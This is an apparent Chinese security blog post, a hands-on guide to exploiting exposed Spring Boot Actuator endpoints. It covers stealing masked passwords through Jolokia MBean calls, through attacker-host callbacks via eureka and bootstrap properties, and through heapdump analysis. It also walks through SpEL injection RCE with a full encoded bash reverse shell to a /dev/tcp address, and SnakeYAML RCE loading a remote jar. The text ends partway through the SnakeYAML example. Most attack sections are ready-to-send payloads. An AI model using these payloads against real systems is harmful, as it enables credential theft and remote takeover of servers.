    <title>Spring Boot Actuator未授权访问利用实战利用</title>
    <url>/2021/10/22/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="Spring-Boot-Actuator未授权访问利用"><a href="#Spring-Boot-Actuator未授权访问利用" class="headerlink" title="Spring Boot Actuator未授权访问利用"></a><strong>Spring Boot Actuator未授权访问利用</strong></h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h2><p>Actuator是spring boot提供的用来对应用系统进行自省和监控的功能模块，借助于Actuator开发者可以很方便地对应用系统某些监控指标进行查看、统计等。如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息。Actuator配置不当会导致未授权访问获取网站相关配置甚至RCE</p>
<h2 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h2><p>Spring Cloud 是基于 Spring Boot 来进行构建服务，并提供如配置管理、服务注册与发现、智能路由等常见功能的帮助快速开发分布式系统的系列框架的有序集合</p>
<h3 id="组件版本相互依赖关系"><a href="#组件版本相互依赖关系" class="headerlink" title="组件版本相互依赖关系"></a>组件版本相互依赖关系</h3><p>![image-20210825221013561](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210825221013561.png)</p>
<h3 id="Spring-Cloud-与-Spring-Boot-版本之间的依赖关系"><a href="#Spring-Cloud-与-Spring-Boot-版本之间的依赖关系" class="headerlink" title="Spring Cloud 与 Spring Boot 版本之间的依赖关系"></a>Spring Cloud 与 Spring Boot 版本之间的依赖关系</h3><p>![image-20210825221109141](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210825221109141.png)</p>
<h3 id="Spring-Cloud-小版本号的后缀及含义"><a href="#Spring-Cloud-小版本号的后缀及含义" class="headerlink" title="Spring Cloud 小版本号的后缀及含义"></a>Spring Cloud 小版本号的后缀及含义</h3><p>![image-20210825221154274](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210825221154274.png)</p>
<p>[TOC]</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>环境准备：JDK 1.8 or later and Maven 3.2+</p>
<p>漏洞环境集合源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">链接：https://pan.baidu.com/s/18PSZvDxIRFwuNQBxo__4Ng </span><br><span class="line">提取码：jfzx </span><br></pre></td></tr></table></figure>



<p>下面是网盘中的资源包对应的命令执行漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">springboot-spel-rce包-------------------------------------命令执行2.1  </span><br><span class="line">springcloud-snakeyaml-rce包-------------------------------命令执行2.2</span><br><span class="line">actuator-testbed-master包---------------------------------命令执行2.3  2.4  2.5</span><br><span class="line">springboot-h2-database-rce包------------------------------命令执行2.6  2.8</span><br><span class="line">springboot-restart-rce包----------------------------------命令执行2.7  2.10 2.11 2.12</span><br><span class="line">springboot-mysql-jdbc-rce --------------------------------命令执行2.9</span><br><span class="line">maliciousRMIServer包包含RMI服务代码</span><br></pre></td></tr></table></figure>



<p>修改监听端口(不修改的话默认只能在搭建环境主机上访问)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">src/main/resources/application.properties server.address=0.0.0.0</span><br></pre></td></tr></table></figure>



<p>安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mvn install</span><br></pre></td></tr></table></figure>



<p>启动服务(安装完成后会在主目录下生成后target文件夹，执行里面的jar包启动服务)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ./target/xxxxxxxx.jar</span><br></pre></td></tr></table></figure>

<p>![](Spring Boot Actuator未授权访问利用实战利用&#x2F;a149799f8e8cf1d346efe3ee5649f3d1.png)</p>
<p>访问http:<em>&#x2F;&#x2F;127.0.0.1:8090显示springboot欢迎页面</em></p>
<p>![](Spring Boot Actuator未授权访问利用实战利用&#x2F;733cfef5eb93509eee7b349f83def144.png)</p>
<p>当访问错误页面时，会提示错误信息</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用&#x2F;b84c0336ffa31a1c60da33c76f379659.png)</p>
<p>这里访问env就可以看到环境特性</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用&#x2F;0b00e02831d25ebd363910e0a85f6c16.png)</p>
<p>访问health显示应用的健康状态</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用&#x2F;e506922f3ff848db66817588eb0afe41.png)</p>
<h2 id="漏洞集合"><a href="#漏洞集合" class="headerlink" title="漏洞集合"></a>漏洞集合</h2><h3 id="1-信息泄露"><a href="#1-信息泄露" class="headerlink" title="1.信息泄露"></a>1.信息泄露</h3><h4 id="1-1-路由及接口调用详情泄露"><a href="#1-1-路由及接口调用详情泄露" class="headerlink" title="1.1.路由及接口调用详情泄露"></a>1.1.路由及接口调用详情泄露</h4><blockquote>
<p>开发人员没有意识到地址泄漏会导致安全隐患或者开发环境切换为线上生产环境时，相关人员没有更改配置文件，忘记切换环境配置等</p>
</blockquote>
<p>可以访问以下swagger相关路由进行验证</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/v2/api-docs</span><br><span class="line">/swagger-ui.html</span><br><span class="line"></span><br><span class="line">/swagger</span><br><span class="line">/api-docs</span><br><span class="line">/api.html</span><br><span class="line">/swagger-ui</span><br><span class="line">/swagger/codes</span><br><span class="line">/api/index.html</span><br><span class="line">/api/v2/api-docs</span><br><span class="line">/v2/swagger.json</span><br><span class="line">/swagger-ui/html</span><br><span class="line">/distv2/index.html</span><br><span class="line">/swagger/index.html</span><br><span class="line">/sw/swagger-ui.html</span><br><span class="line">/api/swagger-ui.html</span><br><span class="line">/static/swagger.json</span><br><span class="line">/user/swagger-ui.html</span><br><span class="line">/swagger-ui/index.html</span><br><span class="line">/swagger-dubbo/api-docs</span><br><span class="line">/template/swagger-ui.html</span><br><span class="line">/swagger/static/index.html</span><br><span class="line">/dubbo-provider/distv2/index.html</span><br><span class="line">/spring-security-rest/api/swagger-ui.html</span><br><span class="line">/spring-security-oauth-resource/swagger-ui.html</span><br></pre></td></tr></table></figure>



<p><strong>一般来讲，暴露出 spring boot 应用的相关接口和传参信息并不能算是漏洞</strong>，但是以 “<strong>默认安全</strong>“ 来讲，不暴露出这些信息更加安全。</p>
<p>对于攻击者来讲，一般会仔细审计暴露出的接口以增加对业务系统的了解，并会同时检查应用系统是否存在未授权访问、越权等其他业务类型漏洞</p>
<p><strong>还有一些内置的端点路由由于未设置actuator访问控制暴露</strong></p>
<p>所有端点皆可以在org.springframework.boot.actuate.endpoint中找到表达的含义</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用&#x2F;33a5ec86aaddffe377ab51095d2b50db.png)</p>
<blockquote>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注：Spring1.x在url跟路径下进行注册，在2.x版本中移动到/actuator的路径下：</span><br><span class="line"></span><br><span class="line">Spring1.x与2.x在post请求方面也存在差异，</span><br><span class="line"></span><br><span class="line">1.x通过application/x-www-form-urlencoded 进行post请求，</span><br><span class="line"></span><br><span class="line">2.x通过传递json包请求的applistion/json</span><br></pre></td></tr></table></figure>
</blockquote>
<p>其中对寻找漏洞比较重要接口的有：</p>
<ul>
<li><p><code>/env</code>、<code>/actuator/env</code></p>
<p>GET 请求 <code>/env</code> 会直接泄露环境变量、内网地址、配置中的用户名等信息；当程序员的属性名命名不规范，例如 password 写成 psasword、pwd 时，会泄露密码明文；</p>
<p>同时有一定概率可以通过 POST 请求 <code>/env</code> 接口设置一些属性，间接触发相关 RCE 漏洞；同时有概率获得星号遮掩的密码、密钥等重要隐私信息的明文。</p>
</li>
<li><p><code>/refresh</code>、<code>/actuator/refresh</code></p>
<p>POST 请求 <code>/env</code> 接口设置属性后，可同时配合 POST 请求 <code>/refresh</code> 接口刷新属性变量来触发相关 RCE 漏洞。</p>
</li>
<li><p><code>/restart</code>、<code>/actuator/restart</code></p>
<p>暴露出此接口的情况较少；可以配合 POST请求 <code>/env</code> 接口设置属性后，再 POST 请求 <code>/restart</code> 接口重启应用来触发相关 RCE 漏洞。</p>
</li>
<li><p><code>/jolokia</code>、<code>/actuator/jolokia</code></p>
<p>可以通过 <code>/jolokia/list</code> 接口寻找可以利用的 MBean，间接触发相关 RCE 漏洞、获得星号遮掩的重要隐私信息的明文等。</p>
</li>
<li><p><code>/trace</code>、<code>/actuator/httptrace</code></p>
<p>一些 http 请求包访问跟踪信息，有可能在其中发现内网应用系统的一些请求信息详情；以及有效用户或管理员的 cookie、jwt token 等信息。</p>
</li>
</ul>
<blockquote>
<p>除了上面一些端点路由，还有程序员自定义的根路径</p>
<ul>
<li>&#x2F;manage、&#x2F;management、项目APP相关名称</li>
<li>修改内置端点名字(如有些时候&#x2F;env被程序员修改为&#x2F;appenv)</li>
</ul>
</blockquote>
<h4 id="1-2-端点路由泄露导致敏感信息泄露"><a href="#1-2-端点路由泄露导致敏感信息泄露" class="headerlink" title="1.2.端点路由泄露导致敏感信息泄露"></a>1.2.端点路由泄露导致敏感信息泄露</h4><p><strong>认证字段的获取以证明可影响其他用户</strong></p>
<blockquote>
<p>这个主要通过访问&#x2F;trace 路径获取用户认证字段信息，比如如下站点存在 actuator<br>配置不当漏洞，在其 trace 路径下，除了记录有基本的 HTTP 请求信息（时间戳、HTTP<br>头等），还有用户 token、cookie字段</p>
</blockquote>
<p>trace 路径：</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用&#x2F;d50c0dccc7f6b5f4a461764a2f7065b4.png)</p>
<p>用户字段泄露:</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用&#x2F;561692caae82f0847bc116f9873e09d1.png)</p>
<p>通过替换 token 字段可获取其他用户的信息</p>
<p><strong>数据库账户密码泄露</strong></p>
<p>由于 actuator 会监控站点 mysql、mangodb<br>之类的数据库服务，所以通过监控信息有时可以拿下 mysql、mangodb<br>数据库；这个主要通过&#x2F;env 路径获取这些服务的配置信息，比如如下站点存在 actuator<br>配置不当漏洞，通过其&#x2F;env 路径，可获得 mysql、mangodb 的用户名及密码：</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用&#x2F;db9fb7d5cba6a62bd56ea1cf07835469.png)</p>
<p><strong>Gitlab源代码泄露</strong></p>
<p>这个一般是在&#x2F;health 路径，比如如下站点，访问其 health 路径可探测到站点 git<br>项目地址：</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用&#x2F;813b4e89bbaa2442f21e889e89be4d9c.png)</p>
<p><strong>后台用户账号密码泄露</strong></p>
<p>这个一般是在&#x2F;heapdump 路径下，访问&#x2F;heapdump 路径，返回 GZip 压缩 hprof<br>堆转储文件。在 Android studio<br>打开，会泄露站点内存信息，很多时候会包含后台用户的账号密码，泄露账号密码</p>
<h4 id="1-3获取星号脱敏的密码明文"><a href="#1-3获取星号脱敏的密码明文" class="headerlink" title="1.3获取星号脱敏的密码明文"></a>1.3获取星号脱敏的密码明文</h4><h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><blockquote>
<p>访问 &#x2F;env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果</p>
</blockquote>
<h6 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h6><ul>
<li>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</li>
<li>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）</li>
</ul>
<h6 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h6><p><strong>步骤一:确定属性名</strong></p>
<p>访问目标网站的&#x2F;env或&#x2F;actuator&#x2F;env端点接口，全局搜索星号(*************)，通过被星号遮掩的属性值找到想要的目标属性</p>
<p><strong>步骤二:jolokia 调用相关 Mbean</strong> </p>
<p>这里需要获取的属性名为security.user,password，直接发包可以在响应包中的value键值中看到</p>
<ul>
<li>调用 <code>org.springframework.boot</code> Mbean</li>
</ul>
<blockquote>
<p>实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法</p>
</blockquote>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>调用 <code>org.springframework.cloud.context.environment</code> Mbean</li>
</ul>
<blockquote>
<p>实际上是调用 org.springframework.cloud.context.environment.EnvironmentManager 类实例的 getProperty 方法</p>
</blockquote>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>调用其他 Mbean</li>
</ul>
<blockquote>
<p>目标具体情况和存在的 Mbean 可能不一样，可以搜索 getProperty 等关键词，寻找可以调用的方法。</p>
</blockquote>
<h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><h6 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h6><ul>
<li>可以 GET 请求目标网站的 <code>/env</code> </li>
<li>可以 POST 请求目标网站的 <code>/env</code> </li>
<li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li>
<li>目标使用了 <code>spring-cloud-starter-netflix-eureka-client</code> 依赖</li>
<li>目标可以请求攻击者的服务器（请求可出外网）</li>
</ul>
<h6 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h6><p><strong>步骤一:确定属性名</strong></p>
<p>访问目标网站的&#x2F;env或&#x2F;actuator&#x2F;env端点接口，全局搜索星号(*************)，通过被星号遮掩的属性值找到想要的目标属性</p>
<p><strong>步骤二： 使用 nc 监听 HTTP 请求</strong></p>
<p>在自己控制的外网服务器上监听 80 端口：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 80</span><br></pre></td></tr></table></figure>



<p><strong>步骤三：  触发对外 http 请求</strong></p>
<p><code>eureka.client.serviceUrl.defaultZone=http://value:$&#123;属性&#125;@your-vps-ip:port</code>  </p>
<p><code>属性</code>替换为想要获取的目标属性</p>
<p><code>your-vps-ip</code> 换成自己外网服务器的真实 ip 地址</p>
<p><code>port</code>为前面监听的端口</p>
<ul>
<li><code>eureka.client.serviceUrl.defaultZone</code> 方法（<strong>不适用于</strong>明文数据中有特殊 url 字符的情况）</li>
</ul>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone=http://value:$&#123;属性&#125;@your-vps-ip:port</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://value:$&#123;属性&#125;@your-vps-ip:port&quot;&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li><code>spring.cloud.bootstrap.location</code> 方法（<strong>同时适用于</strong>明文数据中有特殊 url 字符的情况）</li>
</ul>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.cloud.bootstrap.location=http://your-vps-ip:port/?=$&#123;属性&#125;</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http://your-vps-ip:port/?=$&#123;属性&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>



<p><strong>步骤四： 刷新配置</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>步骤五： 解码属性值</strong></p>
<p>正常的话，此时 nc 监听的服务器会收到目标发来的请求，其中包含类似如下 <code>Authorization</code> 头内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Authorization: Basic dmFsdWU6MTIzNDU2</span><br></pre></td></tr></table></figure>

<p>将其中的 <code>dmFsdWU6MTIzNDU2</code>部分使用 base64 解码，即可获得类似明文值 <code>value:123456</code>，其中的 <code>123456</code> 即是目标星号 * 脱敏前的属性值明文。</p>
<h5 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h5><h6 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a>利用条件</h6><ul>
<li>可正常 GET 请求目标 <code>/heapdump</code> 或 <code>/actuator/heapdump</code> 接口</li>
</ul>
<h6 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h6><p><strong>步骤一:确定属性名</strong></p>
<p>访问目标网站的&#x2F;env或&#x2F;actuator&#x2F;env端点接口，全局搜索星号(*************)，通过被星号遮掩的属性值找到想要的目标属性</p>
<p><strong>步骤二:下载 jvm heap 信息</strong></p>
<blockquote>
<p>下载的 heapdump 文件大小通常在 50M—500M 之间，有时候也可能会大于 2G</p>
</blockquote>
<p><code>GET</code> 请求目标的 <code>/heapdump</code> 或 <code>/actuator/heapdump</code> 接口，下载应用实时的 JVM 堆信息</p>
<p><strong>步骤三:使用 MAT 获得 jvm heap 中的密码明文</strong></p>
<p>参考 <a href="https://landgrey.me/blog/16/">文章</a> 方法，使用 <a href="https://www.eclipse.org/mat/downloads.php">Eclipse Memory Analyzer</a> 工具的 <strong>OQL</strong> 语句 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</span><br></pre></td></tr></table></figure>

<p>辅助用 “<strong>password</strong>“ 等关键词快速过滤分析，获得密码等相关敏感信息的明文。</p>
<h3 id="2-命令执行"><a href="#2-命令执行" class="headerlink" title="2.命令执行"></a>2.命令执行</h3><h4 id="2-1-whitelabel-error-page-SpEL-RCE"><a href="#2-1-whitelabel-error-page-SpEL-RCE" class="headerlink" title="2.1.whitelabel error page SpEL RCE"></a>2.1.whitelabel error page SpEL RCE</h4><h5 id="利用条件-3"><a href="#利用条件-3" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>spring boot 1.1.0-1.1.12、1.2.0-1.2.7、1.3.0</li>
<li>至少知道一个触发 springboot 默认错误页面的接口及参数名</li>
</ul>
<h5 id="利用方法-2"><a href="#利用方法-2" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一: 找到目标网站正常传参点</strong></p>
<p>比如发现访问  <code>/xxxx?id=xxx</code> ，页面会报状态码为 500 的默认错误页面</p>
<p><strong>步骤二: 确认漏洞点</strong></p>
<p>输入 <code>/xxxx?id=$&#123;运算表达式&#125;</code> (假设运算表达式为7x7)</p>
<p>如果发现报错页面将 7x7 的值 49 计算出来并显示在报错页面上，那么基本可以确定目标存在 SpEL 表达式注入漏洞。</p>
<p><strong>步骤三: 命令执行漏洞利用</strong></p>
<p>运行代码将执行的命令字符串转换成 <code>0x**</code> java 字节形式(只需将target变量修改为需要执行的命令即可)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">target = <span class="string">&#x27;执行的命令&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> target:</span><br><span class="line">    result += <span class="built_in">hex</span>(<span class="built_in">ord</span>(x)) + <span class="string">&quot;,&quot;</span></span><br><span class="line"><span class="built_in">print</span>(result.rstrip(<span class="string">&#x27;,&#x27;</span>))</span><br></pre></td></tr></table></figure>



<p>执行 <code>open -a Calculator</code> 命令</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//ip:port/article?id=$&#123;T(java.lang.Runtime).getRuntime().exec(new String(new byte[]&#123;0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72&#125;))&#125;</span></span><br></pre></td></tr></table></figure>



<h5 id="利用实例"><a href="#利用实例" class="headerlink" title="利用实例"></a>利用实例</h5><p>环境是上面的资源集合的springboot-spel-rce，环境搭建参照上方</p>
<p>在搭建过程中可能会出现启动jar包时提示没有主清单属性，需要在pom.xml文件中添加依赖完成(参照文章<a href="https://blog.csdn.net/weixin_44373935/article/details/90046451">点击这里</a>)</p>
<p>访问<a href="https://127.0.0.1:9091/article?id=$%7B7*7%7D">https://127.0.0.1:9091/article?id=${7*7}</a></p>
<p>可以看到错误页面中花括号里面的表达式已经计算出来啦，49。此处参数点可利用</p>
<p>![image-20210827133545079](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210827133545079.png)</p>
<p>下面将花括号里面的修改成需要执行的命令</p>
<p>首先要将命令字符串转换为java字节形式，利用上面的python脚本</p>
<p>这里执行的命令为bash反弹shell，先将其进行base64编码转换(<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">在线转换地址</a>)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt; &amp; /dev/tcp/192.168.233.243/9090  0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">转换后:</span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzMy4yNDMvOTA5MCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>



<p>在将其转换为java字节</p>
<p>![image-20210827151659784](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210827151659784.png)</p>
<p>使用nc监听192.168.233.243的9090端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 9090</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>将转换后的java字节拼接到payload中，在浏览器中访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.233.243:9091/article?id=$&#123;T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]&#123;0x62,0x61,0x73,0x68,0x20,0x2d,0x63,0x20,0x7b,0x65,0x63,0x68,0x6f,0x2c,0x59,0x6d,0x46,0x7a,0x61,0x43,0x41,0x74,0x61,0x53,0x41,0x2b,0x4a,0x69,0x41,0x76,0x5a,0x47,0x56,0x32,0x4c,0x33,0x52,0x6a,0x63,0x43,0x38,0x78,0x4f,0x54,0x49,0x75,0x4d,0x54,0x59,0x34,0x4c,0x6a,0x49,0x7a,0x4d,0x79,0x34,0x79,0x4e,0x44,0x4d,0x76,0x4f,0x54,0x41,0x35,0x4d,0x43,0x41,0x77,0x50,0x69,0x59,0x78,0x7d,0x7c,0x7b,0x62,0x61,0x73,0x65,0x36,0x34,0x2c,0x2d,0x64,0x7d,0x7c,0x7b,0x62,0x61,0x73,0x68,0x2c,0x2d,0x69,0x7d&#125;))&#125;</span><br></pre></td></tr></table></figure>



<p>反弹shell成功</p>
<p>![image-20210827152313055](Spring Boot Actuator未授权访问利用实战利用&#x2F;image-20210827152313055.png)</p>
<h5 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h5><ol>
<li>spring boot 处理参数值出错，流程进入 <code>org.springframework.util.PropertyPlaceholderHelper</code> 类中</li>
<li>此时 URL 中的参数值会用 <code>parseStringValue</code> 方法进行递归解析</li>
<li>其中  <code>$&#123;&#125;</code>  包围的内容都会被 <code>org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration</code> 类的 <code>resolvePlaceholder</code> 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞</li>
</ol>
<p>详细分析参见下文:</p>
<p>​    <a href="https://www.cnblogs.com/litlife/p/10183137.html">SpringBoot SpEL表达式注入漏洞-分析与复现</a></p>
<h4 id="2-2Spring-clound-SnakeYAML-RCE"><a href="#2-2Spring-clound-SnakeYAML-RCE" class="headerlink" title="2.2Spring clound SnakeYAML RCE"></a>2.2Spring clound SnakeYAML RCE</h4><h5 id="利用条件-4"><a href="#利用条件-4" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li>
<li>目标依赖的 <code>spring-cloud-starter</code> 版本 &lt; 1.3.0.RELEASE</li>
<li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li>
</ul>
<h5 id="利用方法-3"><a href="#利用方法-3" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一</strong>: <strong>托管yml和jar文件</strong></p>
<blockquote>
<p>首先在自己的机器上开启个python的http服务(或者使用apache和nginx)，然后将yml文件(访问jar包)和jar包放在根目录下，便于访问</p>
</blockquote>
<p>在根目录下放置yml文件，内容如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">!!javax.script.ScriptEngineManager [</span><br><span class="line">  !!java.net.URLClassLoader [[</span><br><span class="line">    !!java.net.URL [<span class="string">&quot;http://your-ip-ip/example.jar&quot;</span>]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>



<p>在根目录下放置example.jar包(需要执行的命令)，代码编写及编译方式参考 <a href="https://github.com/artsploit/yaml-payload">yaml-payload</a></p>
<p><strong>步骤二： 设置 spring.cloud.bootstrap.location 属性</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.cloud.bootstrap.location=http://your-vps-ip/example.yml</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.yml&quot;&#125;</span><br></pre></td></tr></table></figure>



<p><strong>步骤三： 刷新配置</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="利用实例-1"><a href="#利用实例-1" class="headerlink" title="利用实例"></a><strong>利用实例</strong></h5><p>这里使用的是python开启http服务。当使用python开启http服务时，根目录为当前执行命令的目录，所以先把yml和jar包放置到根目录下在执行python命令开启http服务</p>
<p>在根目录下放置yml文件，内容如下:</p>
